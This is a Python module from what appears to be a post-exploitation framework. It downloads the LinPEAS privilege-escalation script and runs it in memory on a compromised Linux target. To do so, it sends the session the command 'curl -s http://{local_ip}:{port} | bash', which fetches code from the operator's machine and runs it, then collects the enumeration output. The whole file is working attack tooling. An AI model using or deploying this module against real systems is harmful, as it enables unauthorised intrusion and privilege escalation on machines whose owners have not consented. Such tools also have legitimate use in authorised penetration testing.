from __future__ import annotations

import urllib.request

from reaper.modules.blueprint import ReaperModule
from reaper.utils.tcp import get_local_ip, spawn_send_server


_LINPEAS_URL = (
    "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
)


class LinpeasModule(ReaperModule):
    name        = "linpeas"
    description = "Download and execute LinPEAS on the target (in-memory)."
    category    = "Privilege Escalation"
    platform    = ["linux"]
    arguments   = [
        {
            "flags":   ["-o", "--output"],
            "help":    "Save LinPEAS output to this local file",
            "default": None,
        },
    ]

    def run(self) -> None:
        self.notify("info", "Fetching LinPEAS…")
        with self.spinner("Downloading linpeas.sh…"):
            try:
                with urllib.request.urlopen(_LINPEAS_URL, timeout=20) as resp:
                    script = resp.read()
            except Exception as exc:
                self.err(f"Failed to download LinPEAS: {exc}")
                return

        self.notify("info", f"Got {len(script)} bytes – uploading to target…")
        local_ip = get_local_ip(self.session.addr[0])

        with self.spinner("Sending linpeas.sh…"):
            port, thread, errors = spawn_send_server(script, timeout=30.0)
            self.session.conn.sendall(
                f"curl -s http://{local_ip}:{port} | bash\n".encode()
            )

        self.notify("info", "LinPEAS running – output below:")
        self.breaker()

        output_lines = []
        try:
            for line in self.exec_stream(":", timeout=300.0):
                print(f"  {line.text}")
                output_lines.append(line.text)
        except Exception:
            pass

        self.breaker()

        if self.args.output:
            try:
                with open(self.args.output, "w") as fh:
                    fh.write("\n".join(output_lines))
                self.ok(f"Output saved to {self.ui._c(self.args.output)}")
            except OSError as exc:
                self.err(f"Could not save output: {exc}")
